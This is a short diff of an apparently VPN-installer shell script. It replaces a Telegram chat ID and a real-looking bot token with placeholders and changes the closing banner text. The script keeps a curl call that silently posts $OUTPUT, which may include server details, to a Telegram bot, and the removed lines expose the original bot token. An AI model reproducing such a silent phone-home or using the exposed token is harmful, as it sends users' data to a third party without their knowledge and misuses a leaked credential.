@@ -864,14 +864,14 @@ WebAPI: $api773
 =========================
 @SkartiVPN
 "
-CHATID="6389176425"
-KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
+CHATID="tytyd"
+KEY="tytyd"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$OUTPUT" $URL >/dev/null 2>&1
 clear
 echo ""
-echo -e "\033[96m_______________________________\033[0m"
-echo -e "\033[92m  اَلْحَمْدُ لِلهِ رَبِّ اْلعَالَمِيْ \033[0m"
-echo -e "\033[96m_______________________________\033[0m"
+echo -e "\033[96m================================\033[0m"
+echo -e "\033[92m         INSTALL SUCCEED BRO   \033[0m"
+echo -e "\033[96m================================\033[0m"
 sleep 1.5
